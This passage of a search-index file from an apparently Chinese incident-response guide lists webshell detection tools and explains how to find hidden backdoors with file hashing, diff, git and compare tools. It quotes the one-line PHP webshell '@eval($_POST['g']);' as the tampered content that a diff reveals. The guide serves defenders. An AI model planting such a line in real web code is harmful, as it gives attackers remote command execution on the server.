\u68c0\u6d4b\u5f15\u64ce\uff0c\u91c7\u7528\u5148\u8fdb\u7684\u52a8\u6001\u76d1\u6d4b\u6280\u672f\uff0c\u7ed3\u5408\u591a\u79cd\u5f15\u64ce\u96f6\u89c4\u5219\u67e5\u6740\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b\u5728\u7ebf\u67e5\u6740\u6728\u9a6c\uff0c\u514d\u8d39\u5f00\u653e API \u652f\u6301\u6279\u91cf\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a https://scanner.baidu.com 3\u3001\u6cb3\u9a6c \u4e13\u6ce8 WebShell \u67e5\u6740\u7814\u7a76\uff0c\u62e5\u6709\u6d77\u91cf WebShell \u6837\u672c\u548c\u81ea\u4e3b\u67e5\u6740\u6280\u672f\uff0c\u91c7\u7528\u4f20\u7edf\u7279\u5f81+\u4e91\u7aef\u5927\u6570\u636e\u53cc\u5f15\u64ce\u7684\u67e5\u6740\u6280\u672f\u3002\u67e5\u6740\u901f\u5ea6\u5feb\u3001\u7cbe\u5ea6\u9ad8\u3001\u8bef\u62a5\u4f4e\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301 Windows\u3001Linux\uff0c\u652f\u6301\u5728\u7ebf\u67e5\u6740\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a https://www.shellpub.com 4\u3001Web Shell Detector Web Shell Detector \u5177\u6709 WebShell \u7b7e\u540d\u6570\u636e\u5e93\uff0c\u53ef\u5e2e\u52a9\u8bc6\u522b\u9ad8\u8fbe 99\uff05 \u7684 WebShell\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b PHP\u3001Python \u811a\u672c\uff0c\u53ef\u8de8\u5e73\u53f0\uff0c\u5728\u7ebf\u68c0\u6d4b\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a http://www.shelldetector.com github\u9879\u76ee\u5730\u5740\uff1a https://github.com/emposha/PHP-Shell-Detector 5\u3001CloudWalker\uff08\u7267\u4e91\uff09 \u4e00\u4e2a\u53ef\u6267\u884c\u7684\u547d\u4ee4\u884c\u7248\u672c Webshell \u68c0\u6d4b\u5de5\u5177\u3002\u76ee\u524d\uff0c\u9879\u76ee\u5df2\u505c\u6b62\u66f4\u65b0\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b Linux\u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 \u5728\u7ebf\u67e5\u6740 demo\uff1a https://webshellchop.chaitin.cn GitHub \u9879\u76ee\u5730\u5740\uff1a https://github.com/chaitin/cloudwalker 6\u3001Sangfor WebShellKill Sangfor WebShellKill (\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177)\u662f\u4e00\u6b3e Web \u540e\u95e8\u4e13\u6740\u5de5\u5177\uff0c\u4e0d\u4ec5\u652f\u6301 WebShell \u7684\u626b\u63cf\uff0c\u540c\u65f6\u8fd8\u652f\u6301\u6697\u94fe\u7684\u626b\u63cf\u3002\u662f\u4e00\u6b3e\u878d\u5408\u4e86\u591a\u91cd\u68c0\u6d4b\u5f15\u64ce\u7684\u67e5\u6740\u5de5\u5177\u3002\u80fd\u66f4\u7cbe\u51c6\u5730\u68c0\u6d4b\u51faWEB\u7f51\u7ad9\u5df2\u77e5\u548c\u672a\u77e5\u7684\u540e\u95e8\u6587\u4ef6\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301 Windows\u3001linux \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://edr.sangfor.com.cn/backdoor_detection.html \uff08\u5df2\u505c\u6b62\u8bbf\u95ee\uff09 7\u3001\u6df1\u5ea6\u5b66\u4e60\u6a21\u578b\u68c0\u6d4b PHP Webshell \u4e00\u4e2a\u6df1\u5ea6\u5b66\u4e60 PHP WebShell \u67e5\u6740\u5f15\u64ce demo\uff0c\u63d0\u4f9b\u5728\u7ebf\u6837\u672c\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://webshell.cdxy.me 8\u3001PHP Malware Finder PHP-malware-finder \u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u68c0\u6d4bwebshell\u548c\u6076\u610f\u8f6f\u4ef6\u6df7\u6dc6\u4ee3\u7801\u7684\u5de5\u5177 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9bLinux \u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 GitHub \u9879\u76ee\u5730\u5740\uff1a https://github.com/jvoisin/php-malware-finder 9\u3001findWebshell \u8fd9\u4e2a\u9879\u76ee\u662f\u4e00\u6b3e\u57fa\u4e8e Python \u5f00\u53d1\u7684 WebShell \u68c0\u67e5\u5de5\u5177\uff0c\u53ef\u4ee5\u6839\u636e\u7279\u5f81\u7801\u5339\u914d\u68c0\u67e5\u4efb\u610f\u7c7b\u578b\u7684 WebShell \u540e\u95e8\u3002 GitHub \u9879\u76ee\u5730\u5740\uff1a https://github.com/he1m4n6a/findWebshell 10\u3001\u5728\u7ebf WebShell \u67e5\u6740\u5de5\u5177 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://tools.bugscaner.com/killwebshell","title":"\u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E9%9A%90%E8%97%8F%E7%9A%84%20Webshell%20%E5%90%8E%E9%97%A8/","text":"\u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684 Webshell \u540e\u95e8 \u00b6 \u524d\u8a00\uff1a \u00b6 \u5982\u4f55\u5728\u767e\u4e07\u884c\u4ee3\u7801\u91cc\u53d1\u73b0\u9690\u85cf\u7684\u540e\u95e8\uff1f \u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u7684\u7f51\u7ad9\u88ab\u5165\u4fb5\uff0c\u653b\u51fb\u8005\u7559\u4e0b\u9690\u85cf\u7684\u540e\u95e8\uff0c\u4f60\u771f\u7684\u90fd\u53ef\u4ee5\u627e\u51fa\u6765\u5417\uff1f\u9762\u5bf9\u4e00\u4e2a\u5927\u4e2d\u578b\u7684\u5e94\u7528\u7cfb\u7edf\uff0c\u6570\u4ee5\u767e\u4e07\u7ea7\u7684\u4ee3\u7801\u884c\uff0c\u662f\u4e0d\u53ef\u80fd\u505a\u5230\u6bcf\u4e2a\u6587\u4ef6\u6bcf\u6bb5\u4ee3\u7801\u8fdb\u884c\u624b\u5de5\u68c0\u67e5\u7684\u3002 \u5373\u4f7f\u662f\u4e00\u6b3e\u62e5\u6709 99.9% \u7684 Webshell \u68c0\u51fa\u7387\u7684\u68c0\u6d4b\u5f15\u64ce\uff0c\u4f9d\u7136\u53ef\u80fd\u5b58\u5728 Webshell \u7ed5\u8fc7\u7684\u60c5\u51b5\u3002\u53e6\u5916\uff0c\u50cf\u6697\u94fe\u3001\u7f51\u9875\u52ab\u6301\u3001\u9875\u9762\u8df3\u8f6c\u7b49\u5e38\u89c1\u7684\u9ed1\u5e3d SEO \u624b\u6cd5\uff0c\u4e5f\u5f88\u96be\u901a\u8fc7\u624b\u52a8\u68c0\u6d4b\u6216\u5de5\u5177\u68c0\u6d4b\u5168\u90e8\u8bc6\u522b\u51fa\u6765\u3002 \u6700\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u505a\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002\u901a\u8fc7\u4e0e\u539f\u59cb\u4ee3\u7801\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u5feb\u901f\u53d1\u73b0\u6587\u4ef6\u662f\u5426\u88ab\u7be1\u6539\u4ee5\u53ca\u88ab\u7be1\u6539\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\uff0c\u7b2c\u4e00\u4e2a\u524d\u63d0\u662f\uff0c\u4f60\u6240\u5728\u7684\u56e2\u961f\u5df2\u5177\u5907\u4ee3\u7801\u7248\u672c\u7ba1\u7406\u7684\u80fd\u529b\uff0c\u5982\u679c\u4f60\u662f\u4e2a\u4eba\u7ad9\u957f\uff0c\u76f8\u4fe1\u4f60\u5df2\u7ecf\u5907\u4efd\u4e86\u539f\u59cb\u4ee3\u7801\u3002 \u672c\u6587\u5c06\u7ed3\u5408\u5b9e\u9645\u5e94\u7528\uff0c\u4ecb\u7ecd\u51e0\u79cd\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u627e\u51fa\u4ee3\u7801\u4e2d\u6240\u6709\u9690\u85cf\u7684\u540e\u95e8\u3002 1\u3001\u6587\u4ef6 MD5 \u6821\u9a8c \u4e0b\u8f7dD\u76fe_Web\u67e5\u6740\u5de5\u5177\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u7559\u610f\u5230\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\u91cc\uff0c\u9664\u4e86\u6709\u4e00\u4e2a exe \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u6587\u4ef6 md5 \u503c\u3002\u8fd9\u4e2a\u662f\u8f6f\u4ef6\u4f5c\u8005\u5728\u53d1\u5e03\u8f6f\u4ef6\u65f6\uff0c\u901a\u8fc7 md5 \u7b97\u6cd5\u8ba1\u7b97\u51fa\u8be5 exe \u6587\u4ef6\u7684\"\u7279\u5f81\u503c\"\u3002 \u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.d99net.net/down/WebShellKill_V2.0.9.zip \u6587\u4ef6 MD5\uff1a29285decadbce3918a4f8429ec33df46 WebShellKill.exe \u5f53\u7528\u6237\u4e0b\u8f7d\u8f6f\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u6821\u9a8c\u7b97\u6cd5\u8ba1\u7b97\u4e0b\u8f7d\u5230 exe \u6587\u4ef6\u7684\u7279\u5f81\u503c\uff0c\u5e76\u4e0e\u8f6f\u4ef6\u5f00\u53d1\u8005\u53d1\u5e03\u7684\u7279\u5f81\u503c\u6bd4\u8f83\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u76f8\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230\u7684 exe \u6587\u4ef6\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u4e0d\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230 exe \u6587\u4ef6\u662f\u88ab\u7be1\u6539\u8fc7\u7684\u3002 \u90a3\u540c\u7406\u53ef\u5f97\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6240\u6709\u7f51\u7ad9\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21 hash \u503c\u4fdd\u5b58\uff0c\u5f53\u51fa\u73b0\u5e94\u6025\u60c5\u51b5\u65f6\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e00\u6b21 hash \u503c\uff0c\u5e76\u4e0e\u4e0a\u6b21\u4fdd\u5b58\u7684 hash \u503c\u8fdb\u884c\u5bf9\u6bd4\uff0c\u4ece\u800c\u8f93\u51fa\u65b0\u521b\u5efa\u7684\u3001\u4fee\u6539\u8fc7\u53ca\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 \u6587\u4ef6 hash \u503c\u8ba1\u7b97\uff1a def md5sum(file): m=hashlib.md5() if os.path.isfile(file): f=open(file,'rb') for line in f: m.update(line) f.close else: m.update(file) return (m.hexdigest()) \u5bf9\u6587\u4ef6\u8fdb\u884c\u54c8\u5e0c\u503c\u91cd\u65b0\u8ba1\u7b97\uff0c\u8fdb\u884c\u6821\u9a8c\u5bf9\u6bd4\uff0c\u6d4b\u8bd5\u6548\u679c\uff1a \u5982\u4e0a\u56fe\uff0c\u5728\u4e0a\u4f20\u76ee\u5f55\u65b0\u589e\u4e86\u4e00\u4e2a evil.php \u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u88ab\u7be1\u6539\u7684\u6587\u4ef6\u662f low.php \u3002\u4f7f\u7528\u5e38\u89c1\u7684\u7f16\u8f91\u5668 Notepad++ \u8fdb\u884c\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0 low.php \u6587\u4ef6\u91cc\u88ab\u63d2\u5165\u4e86\u4e00\u53e5\u8bdd WebShell\u3002 2\u3001diff \u547d\u4ee4 \u5728 Linux \u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528 diff \u547d\u4ee4\u6765\u6bd4\u8f83\u4e24\u4e2a\u6587\u672c\u6587\u4ef6\u7684\u5dee\u5f02\u3002\u540c\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u5feb\u901f\u627e\u51fa\u4e24\u4e2a\u9879\u76ee\u6587\u4ef6\u7684\u5dee\u5f02\u3002 diff -c -a -r cms1 cms2 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u524d\u4e09\u884c\u5217\u51fa\u4e86\u4e24\u4e2a\u8981\u5bf9\u6bd4\u7684\u6587\u4ef6\u76ee\u5f55\u7684\u5dee\u5f02\uff0c\u53ef\u4ee5\u53d1\u73b0 low.php \u6587\u4ef6\u88ab\u7be1\u6539\u8fc7\uff0c\u7be1\u6539\u7684\u5185\u5bb9\u662f @eval($_POST['g']); \u5907\u6ce8\uff1a\u5982\u679c\u53ea\u662f\u60f3\u67e5\u770b\u4e24\u4e2a\u6587\u4ef6\u662f\u5426\u4e0d\u540c\u53c8\u4e0d\u60f3\u663e\u793a\u5dee\u5f02\u4e4b\u5904\u7684\u8bdd\uff0c\u53ef\u4ee5\u52a0\u4e0a -q \u9009\u9879\u3002 3\u3001\u7248\u672c\u63a7\u5236\u5de5\u5177 \u7248\u672c\u63a7\u5236\u5de5\u5177\uff0c\u6bd4\u5982\u8bf4 git\uff0c\u91cd\u65b0\u4e0a\u4f20\u4ee3\u7801\u5230 git\uff0cadd+commit+push\uff0c\u7136\u540e\u6253\u5f00\u9879\u76ee\uff0c\u70b9\u51fb commits\uff0c\u5728\u5386\u53f2\u63d0\u4ea4\u7248\u672c\u91cc\u9762\uff0c\u67e5\u770b\u6587\u4ef6\u66f4\u6539\u5185\u5bb9\uff0c\u5f88\u5bb9\u6613\u5c31\u53ef\u4ee5\u53d1\u73b0\u4ee3\u7801\u88ab\u7be1\u6539\u7684\u5730\u65b9\u4e86\u3002 \u53e6\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 git diff \u7528\u6765\u6bd4\u8f83\u6587\u4ef6\u4e4b\u95f4\u7684\u4e0d\u540c\u3002 4\u3001\u6587\u4ef6\u5bf9\u6bd4\u5de5\u5177 \u5173\u952e\u8bcd\uff1a\u4ee3\u7801\u5bf9\u6bd4\u5de5\u5177\uff0c\u4f60\u4f1a\u627e\u5230\u5f88\u591a\u597d\u7528\u7684\u5de5\u5177\uff0c\u8fd9\u91cc\u6211\u4eec\u63a8\u8350\u4e24\u6b3e\u6548\u679c\u8fd8\u4e0d\u9519\u7684\u5de5\u5177\uff0cBeyond Compare \u548c WinMerge\u3002 Beyond Compare Beyond Compare \u662f\u4e00\u5957\u7531 Scooter Software \u63a8\u51fa\u7684\u6587\u4ef6\u6bd4\u8f83\u5de5\u5177\u3002\u4e3b\u8981\u7528\u9014\u662f\u5bf9\u6bd4\u4e24\u4e2a\u6587\u4ef6\u5939\u6216\u8005\u6587\u4ef6\uff0c\u5e76\u5c06\u5dee\u5f02\u4ee5\u989c\u8272\u6807\u793a\uff0c\u6bd4\u8f83\u8303\u56f4\u5305\u62ec\u76ee\u5f55\uff0c\u6587\u6863\u5185\u5bb9\u7b49\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.scootersoftware.com/download.php \u8f6f\u4ef6\u4f7f\u7528\u793a\u4f8b\uff0c\u901a\u8fc7\u6587\u4ef6\u5939\u6bd4\u8f83\uff0c\u627e\u51fa\u6587\u4ef6\u5939\u4e2d\u7684\u5dee\u5f02\u5185\u5bb9\u3002 1\u3001\u53cc\u51fb Beyond Compare \uff0c\u6253\u5f00\u8f6f\u4ef6\u4e3b\u9875\uff0c\u9009\u62e9\u6587\u4ef6\u5939\u6bd4\u8f83\u3002 2\u3001\u5728\u53cc\u8fb9\u680f\u8f93\u5165\u6587\u4ef6\u5939\u8def\u5f84\uff0c\u70b9\u51fb\u663e\u793a\u5dee\u522b\uff0c\u5217\u51fa\u5dee\u5f02\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7d2b\u8272\u90e8\u5206\u4e3a\u65b0\u589e\u6587\u4ef6\uff0c\u7ea2\u8272\u90e8\u5206\u4e3a\u7be1\u6539\u6587\u4ef6\u3002 3\u3001\u53cc\u51fb\u5177\u4f53\u6587\u4ef6\uff0c\u8fdb\u5165\u4ee3\u7801\u5bf9\u6bd4\uff0c\u627e\u5230\u4ee3\u7801\u5dee\u5f02\u90e8\u5206\u3002 WinMerge WinMerge \u662f\u4e00\u6b3e\u8fd0\u884c\u4e8e Windows \u7cfb\u7edf\u4e0b\u7684\u6587\u4ef6\u6bd4\u8f83\u548c\u5408\u5e76\u5de5\u5177\uff0c\u4f7f\u7528\u5b83\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u5730\u6bd4\u8f83\u6587\u4ef6\u5939\u548c\u6587\u4ef6\uff0c\u4ee5\u6613\u4e8e\u7406\u89e3\u7684\u53ef\u89c6\u6587\u672c\u683c\u5f0f\u663e\u793a\u5dee\u5f02\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://winmerge.org/downloads/ 1\u3001\u6587\u4ef6 -- \u6253\u5f00\uff0c\u9009\u62e9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\uff0c\u7136\u540e\u70b9\u51fb\u8fdb\u884c\u6bd4\u8f83\u3002 2\u3001\u5728\u540c\u4e00\u4e2a\u754c\u9762\u91cc\uff0c\u901a\u8fc7\u989c\u8272\u548c\u6587\u672c\u63d0\u793a\uff0c\u663e\u793a\u6587\u4ef6\u5939\u5185\u5bb9\u5dee\u5f02\u3002","title":"\u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684 Webshell \u540e\u95e8"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E9%9A%90%E8%97%8F%E7%9A%84%20Webshell%20%E5%90%8E%E9%97%A8/#\u7b2c4\u7bc7\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684-webshell-\u540e\u95e8","text":"","title":"\u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684 Webshell \u540e\u95e8"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E9%9A%90%E8%97%8F%E7%9A%84%20Webshell%20%E5%90%8E%E9%97%A8/#\u524d\u8a00","text":"\u5982\u4f55\u5728\u767e\u4e07\u884c\u4ee3\u7801\u91cc\u53d1\u73b0\u9690\u85cf\u7684\u540e\u95e8\uff1f \u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u7684\u7f51\u7ad9\u88ab\u5165\u4fb5\uff0c\u653b\u51fb\u8005\u7559\u4e0b\u9690\u85cf\u7684\u540e\u95e8\uff0c\u4f60\u771f\u7684\u90fd\u53ef\u4ee5\u627e\u51fa\u6765\u5417\uff1f\u9762\u5bf9\u4e00\u4e2a\u5927\u4e2d\u578b\u7684\u5e94\u7528\u7cfb\u7edf\uff0c\u6570\u4ee5\u767e\u4e07\u7ea7\u7684\u4ee3\u7801\u884c\uff0c\u662f\u4e0d\u53ef\u80fd\u505a\u5230\u6bcf\u4e2a\u6587\u4ef6\u6bcf\u6bb5\u4ee3\u7801\u8fdb\u884c\u624b\u5de5\u68c0\u67e5\u7684\u3002 \u5373\u4f7f\u662f\u4e00\u6b3e\u62e5\u6709 99.9% \u7684 Webshell \u68c0\u51fa\u7387\u7684\u68c0\u6d4b\u5f15\u64ce\uff0c\u4f9d\u7136\u53ef\u80fd\u5b58\u5728 Webshell \u7ed5\u8fc7\u7684\u60c5\u51b5\u3002\u53e6\u5916\uff0c\u50cf\u6697\u94fe\u3001\u7f51\u9875\u52ab\u6301\u3001\u9875\u9762\u8df3\u8f6c\u7b49\u5e38\u89c1\u7684\u9ed1\u5e3d SEO \u624b\u6cd5\uff0c\u4e5f\u5f88\u96be\u901a\u8fc7\u624b\u52a8\u68c0\u6d4b\u6216\u5de5\u5177\u68c0\u6d4b\u5168\u90e8\u8bc6\u522b\u51fa\u6765\u3002 \u6700\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u505a\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u3002\u901a\u8fc7\u4e0e\u539f\u59cb\u4ee3\u7801\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u5feb\u901f\u53d1\u73b0\u6587\u4ef6\u662f\u5426\u88ab\u7be1\u6539\u4ee5\u53ca\u88ab\u7be1\u6539\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\uff0c\u7b2c\u4e00\u4e2a\u524d\u63d0\u662f\uff0c\u4f60\u6240\u5728\u7684\u56e2\u961f\u5df2\u5177\u5907\u4ee3\u7801\u7248\u672c\u7ba1\u7406\u7684\u80fd\u529b\uff0c\u5982\u679c\u4f60\u662f\u4e2a\u4eba\u7ad9\u957f\uff0c\u76f8\u4fe1\u4f60\u5df2\u7ecf\u5907\u4efd\u4e86\u539f\u59cb\u4ee3\u7801\u3002 \u672c\u6587\u5c06\u7ed3\u5408\u5b9e\u9645\u5e94\u7528\uff0c\u4ecb\u7ecd\u51e0\u79cd\u6587\u4ef6\u5b8c\u6574\u6027\u9a8c\u8bc1\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f60\u627e\u51fa\u4ee3\u7801\u4e2d\u6240\u6709\u9690\u85cf\u7684\u540e\u95e8\u3002 1\u3001\u6587\u4ef6 MD5 \u6821\u9a8c \u4e0b\u8f7dD\u76fe_Web\u67e5\u6740\u5de5\u5177\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u7559\u610f\u5230\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\u91cc\uff0c\u9664\u4e86\u6709\u4e00\u4e2a exe \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u6587\u4ef6 md5 \u503c\u3002\u8fd9\u4e2a\u662f\u8f6f\u4ef6\u4f5c\u8005\u5728\u53d1\u5e03\u8f6f\u4ef6\u65f6\uff0c\u901a\u8fc7 md5 \u7b97\u6cd5\u8ba1\u7b97\u51fa\u8be5 exe \u6587\u4ef6\u7684\"\u7279\u5f81\u503c\"\u3002 \u4e0b\u8f7d\u5730\u5740\uff1ahttp://www.d99net.net/down/WebShellKill_V2.0.9.zip \u6587\u4ef6 MD5\uff1a29285decadbce3918a4f8429ec33df46 WebShellKill.exe \u5f53\u7528\u6237\u4e0b\u8f7d\u8f6f\u4ef6\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u6821\u9a8c\u7b97\u6cd5\u8ba1\u7b97\u4e0b\u8f7d\u5230 exe \u6587\u4ef6\u7684\u7279\u5f81\u503c\uff0c\u5e76\u4e0e\u8f6f\u4ef6\u5f00\u53d1\u8005\u53d1\u5e03\u7684\u7279\u5f81\u503c\u6bd4\u8f83\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u76f8\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230\u7684 exe \u6587\u4ef6\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e24\u4e2a\u7279\u5f81\u503c\u4e0d\u540c\uff0c\u5219\u8ba4\u4e3a\u4e0b\u8f7d\u5230 exe \u6587\u4ef6\u662f\u88ab\u7be1\u6539\u8fc7\u7684\u3002 \u90a3\u540c\u7406\u53ef\u5f97\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6240\u6709\u7f51\u7ad9\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21 hash \u503c\u4fdd\u5b58\uff0c\u5f53\u51fa\u73b0\u5e94\u6025\u60c5\u51b5\u65f6\uff0c\u91cd\u65b0\u8ba1\u7b97\u4e00\u6b21 hash \u503c\uff0c\u5e76\u4e0e\u4e0a\u6b21\u4fdd\u5b58\u7684 hash \u503c\u8fdb\u884c\u5bf9\u6bd4\uff0c\u4ece\u800c\u8f93\u51fa\u65b0\u521b\u5efa\u7684\u3001\u4fee\u6539\u8fc7\u53ca\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 \u6587\u4ef6 hash \u503c\u8ba1\u7b97\uff1a def md5sum(file): m=hashlib.md5() if os.path.isfile(file): f=open(file,'rb') for line in f: m.update(line) f.close else: m.update(file) return (m.hexdigest()) \u5bf9\u6587\u4ef6\u8fdb\u884c\u54c8\u5e0c\u503c\u91cd\u65b0\u8ba1\u7b97\uff0c\u8fdb\u884c\u6821\u9a8c\u5bf9\u6bd4\uff0c\u6d4b\u8bd5\u6548\u679c\uff1a \u5982\u4e0a\u56fe\uff0c\u5728\u4e0a\u4f20\u76ee\u5f55\u65b0\u589e\u4e86\u4e00\u4e2a evil.php \u6587\u4ef6\uff0c\u8fd8\u6709\u4e00\u4e2a\u88ab\u7be1\u6539\u7684\u6587\u4ef6\u662f low.php \u3002\u4f7f\u7528\u5e38\u89c1\u7684\u7f16\u8f91\u5668 Notepad++ \u8fdb\u884c\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0 low.php \u6587\u4ef6\u91cc\u88ab\u63d2\u5165\u4e86\u4e00\u53e5\u8bdd WebShell\u3002 2\u3001diff \u547d\u4ee4 \u5728 Linux \u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528 diff \u547d\u4ee4\u6765\u6bd4\u8f83\u4e24\u4e2a\u6587\u672c\u6587\u4ef6\u7684\u5dee\u5f02\u3002\u540c\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u5feb\u901f\u627e\u51fa\u4e24\u4e2a\u9879\u76ee\u6587\u4ef6\u7684\u5dee\u5f02\u3002 diff -c -a -r cms1 cms2 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u524d\u4e09\u884c\u5217\u51fa\u4e86\u4e24\u4e2a\u8981\u5bf9\u6bd4\u7684\u6587\u4ef6\u76ee\u5f55\u7684\u5dee\u5f02\uff0c\u53ef\u4ee5\u53d1\u73b0 low.php \u6587\u4ef6\u88ab\u7be1\u6539\u8fc7\uff0c\u7be1\u6539\u7684\u5185\u5bb9\u662f @eval($_POST['g']); \u5907\u6ce8\uff1a\u5982\u679c\u53ea\u662f\u60f3\u67e5\u770b\u4e24\u4e2a\u6587\u4ef6\u662f\u5426\u4e0d\u540c\u53c8\u4e0d\u60f3\u663e\u793a\u5dee\u5f02\u4e4b\u5904\u7684\u8bdd\uff0c\u53ef\u4ee5\u52a0\u4e0a -q \u9009\u9879\u3002 3\u3001\u7248\u672c\u63a7\u5236\u5de5\u5177 \u7248\u672c\u63a7\u5236\u5de5\u5177\uff0c\u6bd4\u5982\u8bf4 git\uff0c\u91cd\u65b0\u4e0a\u4f20\u4ee3\u7801\u5230 git\uff0cadd+commit+push\uff0c\u7136\u540e\u6253\u5f00\u9879\u76ee\uff0c\u70b9\u51fb commits\uff0c\u5728\u5386\u53f2\u63d0\u4ea4\u7248\u672c\u91cc\u9762\uff0c\u67e5\u770b\u6587\u4ef6\u66f4\u6539\u5185\u5bb9\uff0c\u5f88\u5bb9\u6613\u5c31\u53ef\u4ee5\u53d1\u73b0\u4ee3\u7801\u88ab\u7be1\u6539\u7684\u5730\u65b9\u4e86\u3002 \u53e6\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 git diff \u7528\u6765\u6bd4\u8f83\u6587\u4ef6\u4e4b\u95f4\u7684\u4e0d\u540c\u3002 4\u3001\u6587\u4ef6\u5bf9\u6bd4\u5de5\u5177 \u5173\u952e\u8bcd\uff1a\u4ee3\u7801\u5bf9\u6bd4\u5de5\u5177\uff0c\u4f60\u4f1a\u627e\u5230\u5f88\u591a\u597d\u7528\u7684\u5de5\u5177\uff0c\u8fd9\u91cc\u6211\u4eec\u63a8\u8350\u4e24\u6b3e\u6548\u679c\u8fd8\u4e0d\u9519\u7684\u5de5\u5177\uff0cBeyond Compare \u548c WinMerge\u3002 Beyond Compare Beyond Compare \u662f\u4e00\u5957\u7531 Scooter Software 